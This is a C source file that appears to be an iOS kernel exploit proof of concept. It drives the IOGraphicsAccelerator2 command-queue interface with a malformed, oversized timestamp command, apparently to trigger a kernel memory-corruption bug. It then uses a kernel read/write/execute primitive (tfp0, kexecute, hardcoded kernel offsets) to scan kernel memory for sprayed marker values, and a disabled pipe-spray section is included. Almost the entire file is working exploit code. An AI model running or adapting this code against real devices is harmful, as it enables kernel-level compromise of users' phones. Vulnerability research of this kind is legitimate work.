#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <pthread.h>

#include "helper/krw.h"
#include "helper/offsets.h"
#include "helper/kutils.h"
#include "helper/physrw.h"
#include "helper/translation.h"
#include "helper/kexecute.h"

typedef mach_port_t io_object_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_service_t;
typedef char io_name_t[128];

#define IO_OBJECT_NULL	(MACH_PORT_NULL)
extern const mach_port_t kIOMasterPortDefault;
kern_return_t IOObjectGetClass(io_object_t object, io_name_t className);
kern_return_t IOObjectRelease(io_object_t object);
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect);
kern_return_t IOServiceClose(io_connect_t connect);
CFMutableDictionaryRef IOServiceMatching(const char *name ) CF_RETURNS_RETAINED;
kern_return_t IOConnectAddClient(io_connect_t connect, io_connect_t client);
kern_return_t IOConnectCallMethod(mach_port_t connection, uint32_t selector, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt) AVAILABLE_MAC_OS_X_VERSION_10_5_AND_LATER;
kern_return_t IOConnectCallAsyncMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt) AVAILABLE_MAC_OS_X_VERSION_10_5_AND_LATER;

const int IOAccelCommandQueue2_type = 5;
const int IOAccelSharedUserClient2_type = 2;
const int IOAccelSharedUserClient2_create_shmem_selector = 5;
const int IOAccelCommandQueue2_set_notification_port_selector = 0;
const int IOAccelCommandQueue2_submit_command_buffers_selector = 1;

struct IOAccelDeviceShmemData {
	void *data;
	uint32_t length;
	uint32_t shmem_id;
};

struct IOAccelCommandQueueSubmitArgs_Header {
	uint32_t _unk_1;
	uint32_t count;
};

struct IOAccelCommandQueueSubmitArgs_Command {
	uint32_t command_buffer_shmem_id;
	uint32_t segment_list_shmem_id;
	uint64_t notify_1;
	uint64_t notify_2;
};

struct IOAccelSegmentListHeader {
	uint32_t field_0;
	uint32_t field_4;
	uint32_t segment_count;
	uint32_t length;
};

struct IOAccelSegmentResourceList_ResourceGroup {
	uint32_t resource_id[6];
	uint8_t field_18[48];
	uint16_t resource_flags[6];
	uint8_t field_54[2];
	uint16_t resource_count;
};

struct IOAccelSegmentResourceListHeader {
	uint64_t field_0;
	uint32_t kernel_commands_start_offset;
	uint32_t kernel_commands_end_offset;
	int total_resources;
	uint32_t resource_group_count;
	struct IOAccelSegmentResourceList_ResourceGroup resource_groups[];
};

struct IOAccelKernelCommand {
	uint32_t type;
	uint32_t size;
};

struct IOAccelKernelCommand_CollectTimeStamp {
	struct IOAccelKernelCommand command;
	uint64_t timestamp;
};

static struct IOAccelDeviceShmemData *
IOAccelSharedUserClient2_create_shmem(io_connect_t IOAccelSharedUserClient2, size_t size) {
	struct IOAccelDeviceShmemData *shmem = malloc(sizeof(*shmem));
	assert(shmem != NULL);
	size_t out_size = sizeof(*shmem);
	uint64_t shmem_size = size;
	kern_return_t kr = IOConnectCallMethod(IOAccelSharedUserClient2,
			IOAccelSharedUserClient2_create_shmem_selector,
			&shmem_size, 1,
			NULL, 0,
			NULL, NULL,
			shmem, &out_size);
	assert(kr == KERN_SUCCESS);
	return shmem;
}

static void
IOAccelCommandQueue2_set_notification_port(io_connect_t IOAccelCommandQueue2, mach_port_t notification_port) {
	kern_return_t kr = IOConnectCallAsyncMethod(IOAccelCommandQueue2,
			IOAccelCommandQueue2_set_notification_port_selector,
			notification_port,
			NULL, 0,
			NULL, 0,
			NULL, 0,
			NULL, NULL,
			NULL, NULL);
	assert(kr == KERN_SUCCESS);
}

static void
IOAccelCommandQueue2_submit_command_buffers(io_connect_t IOAccelCommandQueue2,
		const struct IOAccelCommandQueueSubmitArgs_Header *submit_args,
		size_t size) {
	kern_return_t kr = IOConnectCallMethod(IOAccelCommandQueue2,
				 IOAccelCommandQueue2_submit_command_buffers_selector,
				 NULL, 0,
				 submit_args, size,
				 NULL, NULL,
				 NULL, NULL);
	assert(kr == KERN_SUCCESS);
}

static void *
notification_recv_func(void *arg) {
	mach_port_t notification_port = (mach_port_t)(uintptr_t)arg;
	for (;;) {
		struct {
			mach_msg_header_t hdr;
			uint8_t data[0x4000];
		} msg = {};
		kern_return_t kr = mach_msg(&msg.hdr, MACH_RCV_MSG, 0,
				sizeof(msg), notification_port,
				MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
		if (kr == KERN_SUCCESS) {
			int error = *(int *)((uint8_t *)&msg + 0x94);
			uint64_t notify = *(uint64_t *)((uint8_t *)&msg + 0x64);
			printf("notification %llx: error = %d\n", notify, error);
		}
	}
}


void set_nonblock(int fd) 
{
    int flags = fcntl(fd, F_GETFL);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

uint64_t physread64_(uint64_t pa)
{
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;

	uint64_t off_ml_phys_read_data = 0xFFFFFFF0072047D4;
    u.u32[0] = (uint32_t)kexecute(off_ml_phys_read_data + kslide, pa, 4, 0, 0, 0, 0, 0);
    u.u32[1] = (uint32_t)kexecute(off_ml_phys_read_data + kslide, pa+4, 4, 0, 0, 0, 0, 0);
    return u.u64;
}

extern mach_port_t tfp0;

void poc() {
	offsets_init();
	if(init_tfp0() == KERN_SUCCESS) {
		printf("tfp0: 0x%" PRIx32 "\n", tfp0);
		

		int r = get_kbase(&kbase);
    	printf("get_kbase ret: %d, kbase: 0x%llx, kslide: 0x%llx\n", r, kbase, kslide);

		init_kexecute();

		// // getchar();

		// // uint64_t ua = (uint64_t)malloc(0x4000);
		// // printf("ua: 0x%llx, pa: 0x%llx\n", ua, ua_to_pa(ua));

		// // // uint64_t _pmap_find_phys = 0xFFFFFFF0071F8EF4;
		// // uint64_t kret = kexecute(_pmap_find_phys + kslide, 1, 0, 0, 0, 0, 0, 0);
		// // printf("kexecute KSYMBOL_RET_300 kret = %llu\n", kret);

		// // getchar();

		// uint64_t kva = kbase;
		// printf("kva: 0x%llx\n", kva);
		// getchar();

		// printf("kva to pa: 0x%llx\n", ua_to_pa(kva));

		// // kfree(kva, 0x4000);

		// term_kexecute();
		// exit(0);
	}

	kern_return_t kr;

	io_service_t IOGraphicsAccelerator2 = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGraphicsAccelerator2"));
	assert(IOGraphicsAccelerator2 != IO_OBJECT_NULL);
	io_connect_t IOAccelCommandQueue2 = MACH_PORT_NULL;
	IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(), IOAccelCommandQueue2_type, &IOAccelCommandQueue2);
	assert(IOAccelCommandQueue2 != IO_OBJECT_NULL);
	io_connect_t IOAccelSharedUserClient2 = MACH_PORT_NULL;
	IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(), IOAccelSharedUserClient2_type, &IOAccelSharedUserClient2);
	assert(IOAccelSharedUserClient2 != IO_OBJECT_NULL);

	kr = IOConnectAddClient(IOAccelCommandQueue2, IOAccelSharedUserClient2);
	assert(kr == KERN_SUCCESS);

	struct IOAccelDeviceShmemData *command_buffer_shmem = IOAccelSharedUserClient2_create_shmem(IOAccelSharedUserClient2, 0x4000);
	struct IOAccelDeviceShmemData *segment_list_shmem = IOAccelSharedUserClient2_create_shmem(IOAccelSharedUserClient2, 0x4000);






mach_port_t notification_port = 0;
	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
	IOAccelCommandQueue2_set_notification_port(IOAccelCommandQueue2, notification_port);

	pthread_t notification_recv_thread;
	pthread_create(&notification_recv_thread, NULL, notification_recv_func, (void *)(uintptr_t)notification_port);

struct {
		struct IOAccelCommandQueueSubmitArgs_Header header;
		struct IOAccelCommandQueueSubmitArgs_Command command;
	} submit_args = {};
	submit_args.header.count = 1;
	submit_args.command.command_buffer_shmem_id = command_buffer_shmem->shmem_id;
	submit_args.command.segment_list_shmem_id   = segment_list_shmem->shmem_id;

	struct IOAccelSegmentListHeader *slh = (void *)segment_list_shmem->data;
	slh->length = 0x100;
	slh->segment_count = 1;
	struct IOAccelSegmentResourceListHeader *srlh = (void *)(slh + 1);
	srlh->kernel_commands_start_offset = 0;
	srlh->kernel_commands_end_offset = 0x4000;

	struct IOAccelKernelCommand_CollectTimeStamp *cmd1 = (void *)command_buffer_shmem->data;
	cmd1->command.type = 2;
	cmd1->command.size = 0x4000 - 16;
	struct IOAccelKernelCommand_CollectTimeStamp *cmd2 = (void *)((uint8_t *)cmd1 + cmd1->command.size);
	cmd2->command.type = 2;
	cmd2->command.size = 8;

#define KTRW 0

	printf("IOAccelCommandQueue2::submit_command_buffers()\n");
#if KTRW
	sleep(4);
#endif
	// dump_xml_data(&submit_args.header, sizeof(submit_args));
	IOAccelCommandQueue2_submit_command_buffers(IOAccelCommandQueue2, &submit_args.header, sizeof(submit_args));








	*(uint64_t*)(command_buffer_shmem->data + 0x2000) = 0x4141414141414141;
	*(uint64_t*)(command_buffer_shmem->data + 0x2000 + 0x8) = 0x4242424242424242;

	*(uint64_t*)(segment_list_shmem->data + 0x2000) = 0x4343434343434343;
	*(uint64_t*)(segment_list_shmem->data + 0x2000+8) = 0x4545454545454545;

	uint64_t command_buffer_shmem_data_ua = (uint64_t)(command_buffer_shmem->data);
	uint64_t segment_list_shmem_data_ua = (uint64_t)(segment_list_shmem->data);
	
	printf("command_buffer_shmem_data_ua (ua = user address) = 0x%llx\n", command_buffer_shmem_data_ua);
	printf("segment_list_shmem_data_ua (ua = user address) = 0x%llx\n", segment_list_shmem_data_ua);

	uint64_t gIOKitPageableSpace_map = kread64(0xFFFFFFF0076DC0B0 + 0x8 + kslide);
	uint64_t gIOKitPageableSpace_start = kread64(0xFFFFFFF0076DC0B0 + 0x10 + kslide);
	uint64_t gIOKitPageableSpace_end = kread64(0xFFFFFFF0076DC0B0 + 0x18 + kslide);
	
	printf("gIOKitPageableSpace_map: 0x%llx\n", gIOKitPageableSpace_map);
	printf("gIOKitPageableSpace_start: 0x%llx\n", gIOKitPageableSpace_start);
	printf("gIOKitPageableSpace_end: 0x%llx\n", gIOKitPageableSpace_end);


// 00000000 struct __attribute__((aligned(8))) _vm_map // sizeof=0xF8
// 00000000 {
// 00000000     lck_rw_t_0 lock;
// 00000010     vm_map_header hdr; <- HERE !!!!

// 00000000 struct __attribute__((aligned(8))) vm_map_header // sizeof=0x38
// 00000000 {                                       // XREF: _vm_map/r _vm_map_0/r ...
// 00000000     vm_map_links links;                 // XREF: vm_map_remap:loc_FFFFFF8000448364/r <- HERE !!!!

// 00000000 struct vm_map_links // sizeof=0x20
// 00000000 {                                       // XREF: vm_map_header/r
// 00000000                                         // vm_map_entry/r
// 00000000     vm_map_entry *prev;                 // XREF: vm_fault_wire+CC/w
// 00000000                                         // vm_fault_wire+357/w ...
// 00000008     vm_map_entry *next;                 // XREF: vm_fault_wire+C4/w <- HERE !!!!!!
	uint64_t gIOKitPageableSpace_map_entry = kread64(gIOKitPageableSpace_map+0x18);	//0x18 = vme_next
	printf("gIOKitPageableSpace_map_entry = 0x%llx\n", gIOKitPageableSpace_map_entry);

// 00000000 struct vm_map_links // sizeof=0x20
// 00000000 {                                       // XREF: vm_map_header/r
// 00000000                                         // vm_map_entry/r
// 00000000     vm_map_entry *prev;                 // XREF: vm_fault_wire+CC/w
// 00000000                                         // vm_fault_wire+357/w ...
// 00000008     vm_map_entry *next;                 // XREF: vm_fault_wire+C4/w
// 00000008                                         // vm_fault_wire+4C2/w ...
// 00000010     vm_map_offset_t start;              // XREF: vm_fault_wire+BC/w <- HERE !!!!!!
// 00000010                                         // vm_map_delete+D4E/r ...
// 00000018     vm_map_offset_t end;                // XREF: vm_fault_wire+B4/w. <- HERE !!!!!
// 00000018                                         // vm_fault_wire+5FE/w ...
// 00000020 };
	uint64_t gIOKitPageableSpace_map_start = kread64(gIOKitPageableSpace_map_entry+0x10); //0x10 = vm_map_links.start
	uint64_t gIOKitPageableSpace_map_end = kread64(gIOKitPageableSpace_map_entry+0x18); //0x18 = vm_map_links.end
	printf("gIOKitPageableSpace_map_start = 0x%llx\n", gIOKitPageableSpace_map_start);
	printf("gIOKitPageableSpace_map_end = 0x%llx\n", gIOKitPageableSpace_map_end);

	uint64_t kvtophys = 0xFFFFFFF0071F68A0 + kslide;
	uint64_t pa_32 = kexecute(kvtophys, kbase, 0, 0, 0, 0, 0, 0);
	printf("pa32(kbase) = 0x%llx\n", pa_32);

	uint64_t gPhysBase = kread64(0xFFFFFFF0070B96E8 + kslide);
	uint64_t gPhysSize = kread64(0xFFFFFFF0070B9700 + kslide);
	printf("gPhysBase: 0x%llx\n", gPhysBase);
	printf("gPhysSize: 0x%llx\n", gPhysSize);


	printf("pa_32(kbase): 0x%llx\n", physread64_(gPhysBase + pa_32));
	

	for(int i = 0; i < 0x100000; i++) {
		// break;

		uint64_t current = gIOKitPageableSpace_start + i * 0x4000;

		if(current > gIOKitPageableSpace_end) {
			printf("failed to find....\n");
			break;
		}

		uint64_t kvtophys = 0xFFFFFFF0071F68A0 + kslide;

		uint64_t kva = current;

		uint64_t pa_32 = kexecute(kvtophys, current, 0, 0, 0, 0, 0, 0);
		printf("kexecute kvtophys, kva: 0x%llx -> pa: 0x%llx\n", kva, pa_32);

		if(pa_32 == 0)
			continue;


		// if((gPhysBase + gPhysSize) <= (gPhysBase + pa_32)) break;

		// printf("physread64_(gPhysBase + pa_32) = 0x%llx\n", physread64_(gPhysBase + pa_32));

		if(physread64_(gPhysBase + pa_32 + 0x2000) == 0x4141414141414141) {
			printf("found, command_buffer_shmem in kernel: 0x%llx\n", current);
			break;
		}

		// if(kread64(kva) == 0x4141414141414141) {
		// 	printf("found, command_buffer_shmem in kernel: 0x%llx\n", current);
		// 	break;
		// }

		

		// gIOKitPageableSpace_map_entry = kread64(gIOKitPageableSpace_map_entry+0x8);	//0x8 = vm_map_links->next
		// if(gIOKitPageableSpace_map_entry == 0) break;
		// // printf("gIOKitPageableSpace_map_entry (2)= 0x%llx\n", gIOKitPageableSpace_map_entry);	

		// gIOKitPageableSpace_map_start = kread64(gIOKitPageableSpace_map_entry+0x10);	
		// gIOKitPageableSpace_map_end = kread64(gIOKitPageableSpace_map_entry+0x18); 

		// if(gIOKitPageableSpace_map_end - gIOKitPageableSpace_map_start != 0x4000) continue;

		// if(gIOKitPageableSpace_map_start > gIOKitPageableSpace_end) {
		// 	printf("!!! gIOKitPageableSpace_map_start = 0x%llx\n", gIOKitPageableSpace_map_start);
		// 	printf("!!! gIOKitPageableSpace_map_end = 0x%llx\n", gIOKitPageableSpace_map_end);
		// 	break;
		// }

		// printf("gIOKitPageableSpace_map_start = 0x%llx\n", gIOKitPageableSpace_map_start);
		// printf("gIOKitPageableSpace_map_end = 0x%llx\n", gIOKitPageableSpace_map_end);
		

		// uint64_t kptr = kread64(gIOKitPageableSpace_map_start+0x2000);
		// if(kptr == 0x4141414141414141 || kptr == 0x4343434343434343) {
		// 	printf("kptr: 0x%llx\n", kptr);
		// 	break;
		// }
	}

	term_kexecute();

	printf("done\n");


	while(1) {};
	getchar();


	// mach_port_t notification_port = 0;
	// mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
	// IOAccelCommandQueue2_set_notification_port(IOAccelCommandQueue2, notification_port);

	// pthread_t notification_recv_thread;
	// pthread_create(&notification_recv_thread, NULL, notification_recv_func, (void *)(uintptr_t)notification_port);



#if 0
	// pipe preparation
	size_t pagesize = 0x4000;
    void *pipebuf = malloc(pagesize);
    bzero(pipebuf, pagesize);

    int *pipefds = NULL;
    int total_pipes = 5;
    size_t total_pipes_size = total_pipes * 2 * sizeof(int);
    pipefds = malloc(total_pipes_size);
    bzero(pipefds, total_pipes_size);
    for (size_t i = 0; i < total_pipes; i++) 
    {
        /* 
            we arrange our pipes in pairs  
            where pipe N is a read pipe, and 
            pipe N+1 is the corresponding write pipe
        */
        pipefds[i * 2] = -1;
        pipefds[i * 2 + 1] = -1;
        
        int error = pipe(&pipefds[i * 2]);
        if (error != 0 ||
            pipefds[i * 2] < 0 ||
            pipefds[i *  + 1] < 0)
        {
            close(pipefds[i * 2]);
            close(pipefds[i * 2 + 1]);

            total_pipes = i;
            break;   
        }

        set_nonblock(pipefds[i * 2 + 1]);
    }
    printf("total pipes created: %d\n",total_pipes);

	memset(pipebuf, 0x41, pagesize);
	size_t written = write(pipefds[1], pipebuf, pagesize - 1);
	size_t read_sz = read(pipefds[0], pipebuf, pagesize-1);
	printf("pipe written sz: %u, read_sz: %u\n", written, read_sz);

	memset(pipebuf, 0x42, pagesize);
	 written = write(pipefds[2+1], pipebuf, pagesize - 1);
	 read_sz = read(pipefds[2], pipebuf, pagesize-1);
	printf("pipe written sz: %u, read_sz: %u\n", written, read_sz);

	memset(pipebuf, 0x43, pagesize);
	 written = write(pipefds[2*2+1], pipebuf, pagesize - 1);
	 read_sz = read(pipefds[2*2], pipebuf, pagesize-1);
	printf("pipe written sz: %u, read_sz: %u\n", written, read_sz);

	memset(pipebuf, 0x44, pagesize);
	 written = write(pipefds[2*3+1], pipebuf, pagesize - 1);
	 read_sz = read(pipefds[2*3], pipebuf, pagesize-1);
	printf("pipe written sz: %u, read_sz: %u\n", written, read_sz);

	memset(pipebuf, 0x45, pagesize);
	 written = write(pipefds[2*4+1], pipebuf, pagesize - 1);
	 read_sz = read(pipefds[2*4], pipebuf, pagesize-1);
	printf("pipe written sz: %u, read_sz: %u\n", written, read_sz);
#endif





#if 0
	struct {
		struct IOAccelCommandQueueSubmitArgs_Header header;
		struct IOAccelCommandQueueSubmitArgs_Command command;
	} submit_args = {};
	submit_args.header.count = 1;
	submit_args.command.command_buffer_shmem_id = command_buffer_shmem->shmem_id;
	submit_args.command.segment_list_shmem_id   = segment_list_shmem->shmem_id;

	struct IOAccelSegmentListHeader *slh = (void *)segment_list_shmem->data;
	slh->length = 0x100;
	slh->segment_count = 1;
	struct IOAccelSegmentResourceListHeader *srlh = (void *)(slh + 1);
	srlh->kernel_commands_start_offset = 0;
	srlh->kernel_commands_end_offset = 0x4000;

	struct IOAccelKernelCommand_CollectTimeStamp *cmd1 = (void *)command_buffer_shmem->data;
	cmd1->command.type = 2;
	cmd1->command.size = 0x4000 - 16;
	struct IOAccelKernelCommand_CollectTimeStamp *cmd2 = (void *)((uint8_t *)cmd1 + cmd1->command.size);
	cmd2->command.type = 2;
	cmd2->command.size = 8;

#define KTRW 0

	printf("IOAccelCommandQueue2::submit_command_buffers()\n");
#if KTRW
	sleep(4);
#endif
	// dump_xml_data(&submit_args.header, sizeof(submit_args));
	IOAccelCommandQueue2_submit_command_buffers(IOAccelCommandQueue2, &submit_args.header, sizeof(submit_args));
#endif
	printf("timestamp = %llx\n", cmd1->timestamp);
#if KTRW
	sleep(4);
#endif
}

int main(int argc, char *argv[], char *envp[]) {
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
		poc();
		usleep(100000);
		exit(1);
	});
	while(1) {};
    return 0;
}
